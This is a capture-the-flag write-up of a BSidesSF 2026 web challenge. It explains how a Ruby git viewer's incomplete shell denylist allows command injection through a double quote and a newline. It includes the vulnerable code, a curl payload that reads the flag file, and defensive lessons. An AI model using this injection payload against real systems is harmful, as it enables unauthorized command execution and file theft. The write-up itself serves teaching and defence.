# GitFab — BSidesSF 2026

**Category:** Web / Pwn
**Points:** 101
**Author:** ron
**Flag:** `CTF{this-was-like-bit-bucket-cve-2022-36804}`

---

## TL;DR

The app sanitizes shell metacharacters (`; & | \` $ > < !`) but forgets `"` and `\n`. Injecting a double-quote closes the git argument, and a newline separates an arbitrary shell command whose output is captured and rendered in the response.

---

## Description

> I wrote this cool repo-viewer using AI! We know it's secure, because I was careful when I designed the prompt: All commands below are done by shelling out to the git CLI tool using backticks (`), and parsing the output, then formatting it to display - it should take reasonable precautions to prevent shell injection (like removing common shell injection characters before performing actions)

A Ruby/Sinatra git viewer that exposes three endpoints. Flag at `/home/ctf/flag.txt`.

---

## Vulnerability

**CWE-78: OS Command Injection** (cf. CVE-2022-36804 — Bitbucket Server RCE)

### Sanitizer (incomplete)

```ruby
def sanitize_path(path)
  path = path.strip
  path = path.gsub(/[;&|`$><!]/, '')          # strips these chars
  parts = path.split('/').reject { |p| p.empty? || p == '.' || p == '..' }
  File.join(*parts)
end
```

**Missing from the denylist:** `"` (double-quote) and `\n` (newline / `%0a`).

### Injection point

The `/history/` endpoint shells out like this:

```ruby
log = `cd #{REPO_PATH} && git log --pretty=format:"%h|%an|%ad|%s" -- "#{safe_rel}" 2>/dev/null`
halt 404, "..." if log.empty?
```

With `safe_rel = x"\ncat /home/ctf/flag.txt\n#` the shell sees:

```sh
cd /data && git log --pretty=format:"%h|%an|%ad|%s" -- "x"
cat /home/ctf/flag.txt
#"
```

1. `git log -- "x"` exits 0 with empty stdout (no history for that path).
2. `cat /home/ctf/flag.txt` runs and its output lands in Ruby's backtick capture.
3. The flag string is non-empty → `log.empty?` is false → rendered as a "commit SHA".

---

## Exploit

```bash
curl "https://gitfab-3ea4455a.challenges.bsidessf.net/history/x%22%0acat%20/home/ctf/flag.txt%0a%23"
```

- `%22` = `"`
- `%0a` = `\n`
- `%23` = `#` (comments out the trailing `"` so the shell doesn't error)

The flag appears in the HTML response as the `<td>` SHA column of the first history entry.

---

## Why /history/ and not /file/?

The `/file/` endpoint uses `cd REPO && git show HEAD:"safe_rel" 2>/dev/null`. The shell expansion `&&` chains correctly but `git show HEAD:"x"` exits **non-zero** (bad object), which means the chained `cat` never runs AND the stdout is empty → triggers the 404 guard.

The `/history/` endpoint uses `git log -- "x"`, which exits **0** even when a path has no commits. The subsequent `cat` runs freely, its output is captured, and the non-empty string bypasses the `halt 404` guard.

---

## Key Lessons

- Allowlist is always safer than denylist for shell sanitization.
- The right fix is parameterized commands / `Open3.capture2` with argument arrays, not character stripping.
- Even with a denylist, `"` + `\n` are sufficient to achieve full command injection.
- This mirrors CVE-2022-36804 (Bitbucket Server), where a path parameter allowed newline injection into a git command.
